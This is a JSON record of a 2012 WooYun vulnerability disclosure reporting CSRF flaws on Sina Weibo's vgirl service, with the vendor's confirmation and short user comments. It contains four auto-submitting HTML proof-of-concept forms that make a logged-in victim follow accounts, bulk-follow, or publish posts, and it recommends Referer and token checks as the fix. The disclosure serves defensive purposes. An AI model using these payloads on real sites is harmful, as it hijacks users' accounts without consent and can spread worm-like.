{"id": 18070, "wybug_id": "wooyun-2012-09502", "wybug_title": "新浪微博某处CSRF漏洞", "wybug_corp": "新浪", "wybug_author": "imlonghao", "wybug_date": "2012-07-11 17:40", "wybug_open_date": "2012-08-25 17:41", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-25：\t细节向公众公开  简要描述： 我表示我不敢再乱写自评了。。我自评1你们还真的给我2RANK啊。。。新浪微博某处CSRF漏洞，可能导致蠕虫蔓延，在未经用户同意的情况下发布微博/批量加关注 详细说明：  在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。漏洞几乎都是处在微女郎这个站。http://vgirl.weibo.com   漏洞证明：  =========加关注漏洞地址：http://vgirl.weibo.com/interface/weibo/friendships.php\n<html><body><form id=\"imlonghao\" name=\"imlonghao\" action=\"http://vgirl.weibo.com/interface/weibo/friendships.php?act=follow\" method=\"post\"><input type=\"text\" name=\"uid\" value=\"1747906692\" /></form><script>\tdocument.imlonghao.submit();</script></body></html>\n返回信息\n\n=========批量加关注漏洞地址：同上\n<html><body><form id=\"imlonghao\" name=\"imlonghao\" action=\"http://vgirl.weibo.com/interface/weibo/friendships.php?act=followbatch\" method=\"post\"><input type=\"text\" name=\"uids\" value=\"1804283841,1632119007\" /></form><script>\tdocument.imlonghao.submit();</script></body></html>\n返回信息\n\n=========发微博+图片 （图片地址可以是外部地址，会自动下载）漏洞地址：http://vgirl.weibo.com/interface/weibo/statuses.php\n<html><body><form id=\"imlonghao\" name=\"imlonghao\" action=\"http://vgirl.weibo.com/interface/weibo/statuses.php?act=upload\" method=\"post\"><input type=\"text\" name=\"img\" value=\"http://static.youku.com/v1.0.0781/index/img/youkulogo-s.png\" /><input type=\"text\" name=\"text\" value=\"XXXXX\" /></form><script>\tdocument.imlonghao.submit();</script></body></html>\n返回信息\n\n微博\n\n=========发微博漏洞地址：http://vgirl.weibo.com/interface/bbs/topic.php\n<html><body><form id=\"imlonghao\" name=\"imlonghao\" action=\"http://vgirl.weibo.com/interface/bbs/topic.php?act=send_repost\" method=\"post\"><input type=\"text\" name=\"tid\" value=\"1146\" /><input type=\"text\" name=\"content\" value=\"XXX\" /></form><script>\tdocument.imlonghao.submit();</script></body></html>\n返回信息\n\n微博\n\n   修复方案：  检查POST来路Referer在POST的信息中加token   版权声明：转载请注明来源 imlonghao@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-07-11 18:07 厂商回复： 多谢提供，立即处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-11 18:00 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n      害洒家又返回看了下楼主的上个CSRF，果然...    \n     2012-07-11 19:57 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @wanglaojiu 呜呜呜，可怜吧、、、    \n     2012-07-12 08:04 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  @imlonghao 可怜的孩纸    \n     2012-08-10 20:44 |    \t\tVty \t\t\t( 普通白帽子  |\t\t\t        Rank:199 漏洞数:37        )\t\t \n  湖北区欢迎湖北的QQ群234981834    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}